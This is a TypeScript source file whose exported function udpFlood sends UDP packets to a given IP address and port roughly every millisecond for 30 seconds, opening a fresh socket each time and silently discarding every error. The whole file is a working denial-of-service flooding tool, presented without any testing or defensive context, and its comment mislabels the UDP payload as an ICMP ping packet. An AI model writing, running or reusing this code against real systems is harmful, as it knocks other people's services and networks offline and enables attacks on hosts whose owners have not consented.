import dgram = require('dgram');

// ICMP ping packet.
const msg = Buffer.from([
  0x08, 0x00, 0x43, 0x52, 0x00, 0x01, 0x0a, 0x09,
  0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
  0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
  0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
  0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69]);

// ms
const attackDuration = 30000;

export async function udpFlood (ip: string, port: number): Promise<void> {
  console.log(`starting udp flood on ${ip}:${port}`);
  const startTime = new Date();

  return new Promise((resolve) => {
    // not currently keeping track of which local ports are used
    // node uses random port for the udp socket if none is assigned so if it fails we try again
    let udpRequest = () => {
      try {
        const client = dgram.createSocket('udp4');
        client.on('error', () => { return; });
        client.send(msg, port, ip, () => { return; });
      } catch (error) {
        // swallow errors
      }

      if (Date.now() - startTime.getTime() < attackDuration) {
        setTimeout(udpRequest, 1);
      } else {
        resolve();
        console.log(`stopping udp flood ${ip}:${port}`);
      }
    };

    udpRequest();
  });
}
